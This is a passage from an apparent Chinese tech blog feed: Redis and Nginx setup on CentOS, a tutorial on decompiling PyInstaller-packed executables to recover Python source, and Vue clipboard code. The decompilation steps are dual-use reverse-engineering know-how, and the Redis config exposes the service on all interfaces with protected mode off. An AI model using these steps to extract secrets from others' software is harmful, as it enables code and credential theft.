class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">开放端口</span><br>firewall-cmd --zone=public --add-port=8848/tcp --permanent<br><span class="hljs-meta prompt_"># </span><span class="language-bash">重载</span><br>firewall-cmd --reload<br></code></pre></td></tr></table></figure><h2 id="4、redis"><a href="#4、redis" class="headerlink" title="4、redis"></a>4、redis</h2><p>在线安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum install -y epel-release<br>yum -y update<br>yum install -y redis<br><span class="hljs-meta prompt_"># </span><span class="language-bash">常用命令 启动/停止/重启/设置开机自启</span><br>systemctl start/stop/restart/enable redis<br></code></pre></td></tr></table></figure><p>配置文件在<code>/etc/redis.conf</code></p><p>以下为普通安装，如果使用在线安装，只需要做4.3、4.5和4.6</p><p>下载链接：<a href="https://redis.io/download/">Download | Redis</a></p><p><strong>推荐5.0.14版本</strong></p><h3 id="4-1-解压并移动"><a href="#4-1-解压并移动" class="headerlink" title="4.1 解压并移动"></a>4.1 解压并移动</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar -zxvf redis-5.0.14.tar.gz<br>mv redis-5.0.14 /usr/local/redis<br>cd /usr/local/redis<br></code></pre></td></tr></table></figure><h3 id="4-2-安装依赖并编译"><a href="#4-2-安装依赖并编译" class="headerlink" title="4.2 安装依赖并编译"></a>4.2 安装依赖并编译</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum -y install gcc automake autoconf libtool make<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><h3 id="4-3-修改配置文件"><a href="#4-3-修改配置文件" class="headerlink" title="4.3 修改配置文件"></a>4.3 修改配置文件</h3><p><code>vim /usr/local/redis/redis.conf</code>，其他保持默认</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs conf">bind 0.0.0.0<br>protected-mode no<br>daemonize yes<br>requirepass 你的密码<br></code></pre></td></tr></table></figure><h3 id="4-4-把redis做成服务"><a href="#4-4-把redis做成服务" class="headerlink" title="4.4 把redis做成服务"></a>4.4 把redis做成服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /usr/lib/systemd/system/redis.service<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs systemd">[Unit]<br>Description=redis<br>After=network.target<br><br>[Service]<br>Type=forking<br>PIDFile=/var/run/redis_6379.pid<br>ExecStart=/usr/local/redis/src/redis-server /usr/local/redis/redis.conf<br>ExecReload=/bin/kill -s HUP $MAINPID<br>ExecStop=/bin/kill -s QUIT $MAINPID<br>PrivateTmp=true<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><h3 id="4-5-设置开机自启并启动"><a href="#4-5-设置开机自启并启动" class="headerlink" title="4.5 设置开机自启并启动"></a>4.5 设置开机自启并启动</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl daemon-reload<br>systemctl enable redis<br>systemctl start redis<br></code></pre></td></tr></table></figure><h3 id="4-6-放开6379端口"><a href="#4-6-放开6379端口" class="headerlink" title="4.6 放开6379端口"></a>4.6 放开6379端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">开放端口</span><br>firewall-cmd --zone=public --add-port=6379/tcp --permanent<br><span class="hljs-meta prompt_"># </span><span class="language-bash">重载</span><br>firewall-cmd --reload<br></code></pre></td></tr></table></figure><h2 id="5、nginx"><a href="#5、nginx" class="headerlink" title="5、nginx"></a>5、nginx</h2><h3 id="5-1-安装"><a href="#5-1-安装" class="headerlink" title="5.1 安装"></a>5.1 安装</h3><p>配置EPEL源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum install -y epel-release<br>yum -y update<br></code></pre></td></tr></table></figure><p>安装nginx</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum install -y nginx<br></code></pre></td></tr></table></figure><p>安装完成后：</p><ul><li><p>默认网站目录为<code>/usr/share/nginx/html</code></p></li><li><p>默认配置文件在<code>/etc/nginx/nginx.conf</code></p></li><li><p>自定义配置文件目录为<code>/etc/nginx/conf.d/</code></p></li></ul><h3 id="5-2-设置开机自启并启动"><a href="#5-2-设置开机自启并启动" class="headerlink" title="5.2 设置开机自启并启动"></a>5.2 设置开机自启并启动</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl enable nginx<br>systemctl start nginx<br></code></pre></td></tr></table></figure><h3 id="5-3-放开端口"><a href="#5-3-放开端口" class="headerlink" title="5.3 放开端口"></a>5.3 放开端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">开放端口</span><br>firewall-cmd --zone=public --add-port=80/tcp --permanent<br>firewall-cmd --zone=public --add-port=443/tcp --permanent<br><span class="hljs-meta prompt_"># </span><span class="language-bash">重载</span><br>firewall-cmd --reload<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>经验</tag>
      
      <tag>Nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pyinstaller 逆向</title>
    <link href="/2022/10/newpost-50/"/>
    <url>/2022/10/newpost-50/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>在Windows下，逆向由Pyinstaller打包的exe文件，获取源码</p><p>本次仅考虑无<code>-key</code>参数的打包</p><span id="more"></span><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>待逆向文件<code>main.exe</code>，当前电脑已经安装<code>Python 3.7</code>环境</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="一、解包"><a href="#一、解包" class="headerlink" title="一、解包"></a>一、解包</h2><p>首先通过<a href="https://github.com/extremecoders-re/pyinstxtractor">PyInstaller Extractor</a>将exe文件解包，具体方法为：</p><ul><li><p>从上边的github链接，下载<code>pyinstxtractor.py</code>，并放到<code>main.exe</code>文件同一目录</p></li><li><p>cmd进入文件所在目录，执行<code>python pyinstxtractor.py main.exe</code>，得到<code>main.exe_extracted</code>文件夹</p></li></ul><h2 id="二、逆向pyc"><a href="#二、逆向pyc" class="headerlink" title="二、逆向pyc"></a>二、逆向pyc</h2><p>打开<code>main.exe_extracted</code>文件夹，即可轻易看到<code>main.pyc</code>文件（部分程序解包后只有类似<code>main</code>或者其他文件名的无后缀文件，这时候需要找到最有可能是主程序的无后缀文件手动添加<code>.pyc</code>后缀）；</p><p>但是使用pyinstaller打包的python程序，可能会去掉<code>.pyc</code>文件的<code>Magic Number</code>与时间戳信息，其中时间戳信息不重要，全部填充0即可，但是<code>Magic Number</code>与Python 版本挂钩，需要正确恢复。</p><h3 id="2-1-pyc文件修复"><a href="#2-1-pyc文件修复" class="headerlink" title="2.1 pyc文件修复"></a>2.1 pyc文件修复</h3><h4 id="2-1-1-Magic-Number获取"><a href="#2-1-1-Magic-Number获取" class="headerlink" title="2.1.1 Magic Number获取"></a>2.1.1 <code>Magic Number</code>获取</h4><p>可查看<code>main.exe_extracted</code>文件夹下的类似于<code>python37.dll</code>文件，猜测本程序打包所使用的Python版本为<code>Python 3.7</code>，通过查找<code>Magic Number</code>与Python版本对照表（文末附录），可知其<code>Magic Number</code>可能为<code>3390</code>到<code>3394</code>之间；也可通过查找同目录下其他<code>.pyc</code>文件的<code>Magic Number</code>，最终得到其<code>Magic Number</code>确实为3394，16进制值为<code>42 0D</code>，如下图为<code>struct.pyc</code>文件的16进制值（通过HxD或其他Hex查看器）</p><img src="/2022/10/newpost-50/2022-10-28-15-08-37-image.png" class=""><p>而且通过观察发现，许多<code>.pyc</code>文件的第二行都是以<code>E3 00</code>开头。</p><h4 id="2-2-2-main-pyc修复"><a href="#2-2-2-main-pyc修复" class="headerlink" title="2.2.2 main.pyc修复"></a>2.2.2 <code>main.pyc</code>修复</h4><p>通过HxD工具打开<code>main.pyc</code>文件，惊奇的发现其并未缺失信息，因此不用修复；之前的几次逆向都是缺失的，如有缺失，只需要在<code>E3 00</code>前插入<code>42 0D 00 00 00 00 00 00 00 00 00 00 00 00</code>，确保第一行就是这个值，并且第二行以<code>E3 00</code>开头即可，如下图</p><img src="/2022/10/newpost-50/2022-10-28-15-16-14-image.png" class=""><h3 id="2-2-逆向pyc"><a href="#2-2-逆向pyc" class="headerlink" title="2.2 逆向pyc"></a>2.2 逆向pyc</h3><p>cmd到<code>main.pyc</code>文件所在目录，执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install uncompyle6<br>uncompyle6 -o main.py main.pyc<br></code></pre></td></tr></table></figure><p>即可得到如图，可知所有信息一览无余，千万别把密码写在客户端代码里哇</p><img src="/2022/10/newpost-50/2022-10-28-15-19-51-image.png" class=""><p>提示，如果项目有多个python文件，通常都在<code>PYZ-00.pyz_extracted</code>文件夹下，找到对应的<code>.pyc</code>文件，按照上边的方式逆向即可</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs maxima">#     Python <span class="hljs-number">1.5</span>:   <span class="hljs-number">20121</span><br>#     Python <span class="hljs-number">1.5</span><span class="hljs-number">.1</span>: <span class="hljs-number">20121</span><br>#     Python <span class="hljs-number">1.5</span><span class="hljs-number">.2</span>: <span class="hljs-number">20121</span><br>#     Python <span class="hljs-number">1.6</span>:   <span class="hljs-number">50428</span><br>#     Python <span class="hljs-number">2.0</span>:   <span class="hljs-number">50823</span><br>#     Python <span class="hljs-number">2.0</span><span class="hljs-number">.1</span>: <span class="hljs-number">50823</span><br>#     Python <span class="hljs-number">2.1</span>:   <span class="hljs-number">60202</span><br>#     Python <span class="hljs-number">2.1</span><span class="hljs-number">.1</span>: <span class="hljs-number">60202</span><br>#     Python <span class="hljs-number">2.1</span><span class="hljs-number">.2</span>: <span class="hljs-number">60202</span><br>#     Python <span class="hljs-number">2.2</span>:   <span class="hljs-number">60717</span><br>#     Python <span class="hljs-number">2.</span>3a0: <span class="hljs-number">62011</span><br>#     Python <span class="hljs-number">2.</span>3a0: <span class="hljs-number">62021</span><br>#     Python <span class="hljs-number">2.</span>3a0: <span class="hljs-number">62011</span> (!)<br>#     Python <span class="hljs-number">2.</span>4a0: <span class="hljs-number">62041</span><br>#     Python <span class="hljs-number">2.</span>4a3: <span class="hljs-number">62051</span><br>#     Python <span class="hljs-number">2.4b1</span>: <span class="hljs-number">62061</span><br>#     Python <span class="hljs-number">2.</span>5a0: <span class="hljs-number">62071</span><br>#     Python <span class="hljs-number">2.</span>5a0: <span class="hljs-number">62081</span> (ast-branch)<br>#     Python <span class="hljs-number">2.</span>5a0: <span class="hljs-number">62091</span> (with)<br>#     Python <span class="hljs-number">2.</span>5a0: <span class="hljs-number">62092</span> (changed WITH_CLEANUP opcode)<br>#     Python <span class="hljs-number">2.5b3</span>: <span class="hljs-number">62101</span> (<span class="hljs-built_in">fix</span> wrong code: <span class="hljs-keyword">for</span> x, <span class="hljs-keyword">in</span> ...)<br>#     Python <span class="hljs-number">2.5b3</span>: <span class="hljs-number">62111</span> (<span class="hljs-built_in">fix</span> wrong code: x += yield)<br>#     Python <span class="hljs-number">2.</span>5c1: <span class="hljs-number">62121</span> (<span class="hljs-built_in">fix</span> wrong lnotab with <span class="hljs-keyword">for</span> loops <span class="hljs-keyword">and</span><br>#                          storing constants that should have been removed)<br>#     Python <span class="hljs-number">2.</span>5c2: <span class="hljs-number">62131</span> (<span class="hljs-built_in">fix</span> wrong code: <span class="hljs-keyword">for</span> x, <span class="hljs-keyword">in</span> ... <span class="hljs-keyword">in</span> listcomp/genexp)<br>#     Python <span class="hljs-number">2.</span>6a0: <span class="hljs-number">62151</span> (peephole optimizations <span class="hljs-keyword">and</span> STORE_MAP opcode)<br>#     Python <span class="hljs-number">2.</span>6a1: <span class="hljs-number">62161</span> (WITH_CLEANUP optimization)<br>#     Python <span class="hljs-number">2.</span>7a0: <span class="hljs-number">62171</span> (<span class="hljs-built_in">optimize</span> list comprehensions/change LIST_APPEND)<br>#     Python <span class="hljs-number">2.</span>7a0: <span class="hljs-number">62181</span> (<span class="hljs-built_in">optimize</span> conditional branches:<br>#                          introduce POP_JUMP_IF_FALSE <span class="hljs-keyword">and</span> POP_JUMP_IF_TRUE)<br>#     Python <span class="hljs-number">2.</span>7a0  <span class="hljs-number">62191</span> (introduce SETUP_WITH)<br>#     Python <span class="hljs-number">2.</span>7a0  <span class="hljs-number">62201</span> (introduce BUILD_SET)<br>#     Python <span class="hljs-number">2.</span>7a0  <span class="hljs-number">62211</span> (introduce MAP_ADD <span class="hljs-keyword">and</span> SET_ADD)<br>#     Python <span class="hljs-number">3000</span>:   <span class="hljs-number">3000</span><br>#                    <span class="hljs-number">3010</span> (removed UNARY_CONVERT)<br>#                    <span class="hljs-number">3020</span> (added BUILD_SET)<br>#                    <span class="hljs-number">3030</span> (added keyword-only parameters)<br>#                    <span class="hljs-number">3040</span> (added signature annotations)<br>#                    <span class="hljs-number">3050</span> (<span class="hljs-built_in">print</span> becomes a function)<br>#                    <span class="hljs-number">3060</span> (PEP <span class="hljs-number">3115</span> metaclass syntax)<br>#                    <span class="hljs-number">3061</span> (<span class="hljs-built_in">string</span> literals become unicode)<br>#                    <span class="hljs-number">3071</span> (PEP <span class="hljs-number">3109</span> raise changes)<br>#                    <span class="hljs-number">3081</span> (PEP <span class="hljs-number">3137</span> make __file__ <span class="hljs-keyword">and</span> __name__ unicode)<br>#                    <span class="hljs-number">3091</span> (<span class="hljs-built_in">kill</span> str8 interning)<br>#                    <span class="hljs-number">3101</span> (merge from <span class="hljs-number">2.</span>6a0, see <span class="hljs-number">62151</span>)<br>#                    <span class="hljs-number">3103</span> (__file__ <span class="hljs-built_in">points</span> to source file)<br>#     Python <span class="hljs-number">3.</span><span class="hljs-number">0a4</span>: <span class="hljs-number">3111</span> (WITH_CLEANUP optimization).<br>#     Python <span class="hljs-number">3.0b1</span>: <span class="hljs-number">3131</span> (lexical exception stacking, including POP_EXCEPT<br>                          #<span class="hljs-number">3021</span>)<br>#     Python <span class="hljs-number">3.</span>1a1: <span class="hljs-number">3141</span> (<span class="hljs-built_in">optimize</span> list, set <span class="hljs-keyword">and</span> dict comprehensions:<br>#                         change LIST_APPEND <span class="hljs-keyword">and</span> SET_ADD, add MAP_ADD #<span class="hljs-number">2183</span>)<br>#     Python <span class="hljs-number">3.</span>1a1: <span class="hljs-number">3151</span> (<span class="hljs-built_in">optimize</span> conditional branches:<br>#                         introduce POP_JUMP_IF_FALSE <span class="hljs-keyword">and</span> POP_JUMP_IF_TRUE<br>                          #<span class="hljs-number">4715</span>)<br>#     Python <span class="hljs-number">3.</span>2a1: <span class="hljs-number">3160</span> (add SETUP_WITH #<span class="hljs-number">6101</span>)<br>#                   tag: cpython-<span class="hljs-number">32</span><br>#     Python <span class="hljs-number">3.</span>2a2: <span class="hljs-number">3170</span> (add DUP_TOP_TWO, <span class="hljs-built_in">remove</span> DUP_TOPX <span class="hljs-keyword">and</span> ROT_FOUR #<span class="hljs-number">9225</span>)<br>#                   tag: cpython-<span class="hljs-number">32</span><br>#     Python <span class="hljs-number">3.</span>2a3  <span class="hljs-number">3180</span> (add DELETE_DEREF #<span class="hljs-number">4617</span>)<br>#     Python <span class="hljs-number">3.</span>3a1  <span class="hljs-number">3190</span> (__class__ super closure changed)<br>#     Python <span class="hljs-number">3.</span>3a1  <span class="hljs-number">3200</span> (PEP <span class="hljs-number">3155</span> __qualname__ added #<span class="hljs-number">13448</span>)<br>#     Python <span class="hljs-number">3.</span>3a1  <span class="hljs-number">3210</span> (added size modulo <span class="hljs-number">2</span>**<span class="hljs-number">32</span> to the pyc header #<span class="hljs-number">13645</span>)<br>#     Python <span class="hljs-number">3.</span>3a2  <span class="hljs-number">3220</span> (changed PEP <span class="hljs-number">380</span> implementation #<span class="hljs-number">14230</span>)<br>#     Python <span class="hljs-number">3.</span>3a4  <span class="hljs-number">3230</span> (<span class="hljs-built_in">revert</span> changes to <span class="hljs-built_in">implicit</span> __class__ closure #<span class="hljs-number">14857</span>)<br>#     Python <span class="hljs-number">3.</span>4a1  <span class="hljs-number">3250</span> (evaluate positional default arguments before<br>#                        keyword-only defaults #<span class="hljs-number">16967</span>)<br>#     Python <span class="hljs-number">3.</span>4a1  <span class="hljs-number">3260</span> (add LOAD_CLASSDEREF; allow locals of class to override<br>#                        free vars #<span class="hljs-number">17853</span>)<br>#     Python <span class="hljs-number">3.</span>4a1  <span class="hljs-number">3270</span> (various tweaks to the __class__ closure #<span class="hljs-number">12370</span>)<br>#     Python <span class="hljs-number">3.</span>4a1  <span class="hljs-number">3280</span> (<span class="hljs-built_in">remove</span> <span class="hljs-built_in">implicit</span> class argument)<br>#     Python <span class="hljs-number">3.</span>4a4  <span class="hljs-number">3290</span> (changes to __qualname__ computation #<span class="hljs-number">19301</span>)<br>#     Python <span class="hljs-number">3.</span>4a4  <span class="hljs-number">3300</span> (more changes to __qualname__ computation #<span class="hljs-number">19301</span>)<br>#     Python <span class="hljs-number">3.</span>4rc2 <span class="hljs-number">3310</span> (alter __qualname__ computation #<span class="hljs-number">20625</span>)<br>#     Python <span class="hljs-number">3.</span>5a1  <span class="hljs-number">3320</span> (PEP <span class="hljs-number">465</span>: Matrix multiplication operator #<span class="hljs-number">21176</span>)<br>#     Python <span class="hljs-number">3.5b1</span>  <span class="hljs-number">3330</span> (PEP <span class="hljs-number">448</span>: Additional Unpacking Generalizations #<span class="hljs-number">2292</span>)<br>#     Python <span class="hljs-number">3.5b2</span>  <span class="hljs-number">3340</span> (<span class="hljs-built_in">fix</span> dictionary <span class="hljs-built_in">display</span> evaluation order #<span class="hljs-number">11205</span>)<br>#     Python <span class="hljs-number">3.5b3</span>  <span class="hljs-number">3350</span> (add GET_YIELD_FROM_ITER opcode #<span class="hljs-number">24400</span>)<br>#     Python <span class="hljs-number">3.5</span><span class="hljs-number">.2</span>  <span class="hljs-number">3351</span> (<span class="hljs-built_in">fix</span> BUILD_MAP_UNPACK_WITH_CALL opcode #<span class="hljs-number">27286</span>)<br>#     Python <span class="hljs-number">3.</span>6a0  <span class="hljs-number">3360</span> (add FORMAT_VALUE opcode #<span class="hljs-number">25483</span>)<br>#     Python <span class="hljs-number">3.</span>6a1  <span class="hljs-number">3361</span> (lineno <span class="hljs-built_in">delta</span> of code.co_lnotab becomes signed #<span class="hljs-number">26107</span>)<br>#     Python <span class="hljs-number">3.</span>6a2  <span class="hljs-number">3370</span> (<span class="hljs-number">16</span> bit wordcode #<span class="hljs-number">26647</span>)<br>#     Python <span class="hljs-number">3.</span>6a2  <span class="hljs-number">3371</span> (add BUILD_CONST_KEY_MAP opcode #<span class="hljs-number">27140</span>)<br>#     Python <span class="hljs-number">3.</span>6a2  <span class="hljs-number">3372</span> (MAKE_FUNCTION simplification, <span class="hljs-built_in">remove</span> MAKE_CLOSURE<br>#                         #<span class="hljs-number">27095</span>)<br>#     Python <span class="hljs-number">3.6b1</span>  <span class="hljs-number">3373</span> (add BUILD_STRING opcode #<span class="hljs-number">27078</span>)<br>#     Python <span class="hljs-number">3.6b1</span>  <span class="hljs-number">3375</span> (add SETUP_ANNOTATIONS <span class="hljs-keyword">and</span> STORE_ANNOTATION opcodes<br>#                         #<span class="hljs-number">27985</span>)<br>#     Python <span class="hljs-number">3.6b1</span>  <span class="hljs-number">3376</span> (simplify CALL_FUNCTIONs &amp; BUILD_MAP_UNPACK_WITH_CALL<br>                          #<span class="hljs-number">27213</span>)<br>#     Python <span class="hljs-number">3.6b1</span>  <span class="hljs-number">3377</span> (set __class__ cell from type.__new__ #<span class="hljs-number">23722</span>)<br>#     Python <span class="hljs-number">3.6b2</span>  <span class="hljs-number">3378</span> (add BUILD_TUPLE_UNPACK_WITH_CALL #<span class="hljs-number">28257</span>)<br>#     Python <span class="hljs-number">3.</span>6rc1 <span class="hljs-number">3379</span> (more thorough __class__ validation #<span class="hljs-number">23722</span>)<br>#     Python <span class="hljs-number">3.</span>7a1  <span class="hljs-number">3390</span> (add LOAD_METHOD <span class="hljs-keyword">and</span> CALL_METHOD opcodes #<span class="hljs-number">26110</span>)<br>#     Python <span class="hljs-number">3.</span>7a2  <span class="hljs-number">3391</span> (update GET_AITER #<span class="hljs-number">31709</span>)<br>#     Python <span class="hljs-number">3.</span>7a4  <span class="hljs-number">3392</span> (PEP <span class="hljs-number">552</span>: Deterministic pycs #<span class="hljs-number">31650</span>)<br>#     Python <span class="hljs-number">3.7b1</span>  <span class="hljs-number">3393</span> (<span class="hljs-built_in">remove</span> STORE_ANNOTATION opcode #<span class="hljs-number">32550</span>)<br>#     Python <span class="hljs-number">3.7b5</span>  <span class="hljs-number">3394</span> (restored docstring as the <span class="hljs-built_in">first</span> stmt <span class="hljs-keyword">in</span> the body;<br>#                         this might affected the <span class="hljs-built_in">first</span> line number #<span class="hljs-number">32911</span>)<br>#     Python <span class="hljs-number">3.</span>8a1  <span class="hljs-number">3400</span> (move frame <span class="hljs-built_in">block</span> handling to compiler #<span class="hljs-number">17611</span>)<br>#     Python <span class="hljs-number">3.</span>8a1  <span class="hljs-number">3401</span> (add END_ASYNC_FOR #<span class="hljs-number">33041</span>)<br>#     Python <span class="hljs-number">3.</span>8a1  <span class="hljs-number">3410</span> (PEP570 Python Positional-Only Parameters #<span class="hljs-number">36540</span>)<br>#     Python <span class="hljs-number">3.8b2</span>  <span class="hljs-number">3411</span> (Reverse evaluation order of <span class="hljs-built_in">key</span>: value <span class="hljs-keyword">in</span> dict<br>#                         comprehensions #<span class="hljs-number">35224</span>)<br>#     Python <span class="hljs-number">3.8b2</span>  <span class="hljs-number">3412</span> (Swap the <span class="hljs-built_in">position</span> of positional <span class="hljs-built_in">args</span> <span class="hljs-keyword">and</span> positional<br>#                         only <span class="hljs-built_in">args</span> <span class="hljs-keyword">in</span> ast.argumehttps://blog.csdn.net/zheng__huang/article/details/112380221nts #<span class="hljs-number">37593</span>)<br>#     Python <span class="hljs-number">3.8b4</span>  <span class="hljs-number">3413</span> (Fix <span class="hljs-string">&quot;break&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;continue&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;finally&quot;</span> #<span class="hljs-number">37830</span>)<br></code></pre></td></tr></table></figure><blockquote><p>参考1 <a href="https://blog.csdn.net/zheng__huang/article/details/112380221">Python Uncompyle6 反编译工具使用 与 Magic Number 详解</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>逆向</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VUE实现复制与粘贴_获取剪切板内容</title>
    <link href="/2022/09/newpost-49/"/>
    <url>/2022/09/newpost-49/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>在VUE项目中实现复制与粘贴。</p><span id="more"></span><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="1-复制"><a href="#1-复制" class="headerlink" title="1. 复制"></a>1. 复制</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">npm install --save v-clipboard<br></code></pre></td></tr></table></figure><p><code>main.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Clipboard</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;v-clipboard&#x27;</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Clipboard</span>)<br></code></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">this</span>.$clipboard(value);<br></code></pre></td></tr></table></figure><blockquote><p>更多使用方式可参见文档：<a href="https://github.com/euvl/v-clipboard">https://github.com/euvl/v-clipboard</a></p></blockquote><h2 id="2-粘贴"><a href="#2-粘贴" class="headerlink" title="2. 粘贴"></a>2. 粘贴</h2><p>粘贴的本质是获取剪切板内容，然后赋值给需要粘贴的地方，获取剪切板内容可以使用下边的方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">navigator.<span class="hljs-property">clipboard</span>.<span class="hljs-title function_">readText</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;剪切板内容:&#x27;</span>, res);<br>&#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;获取剪切板内容失败:&#x27;</span>, err);<br>&#125;);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>前端</tag>
      
      <tag>Vue</tag>
      
    </tags>
    
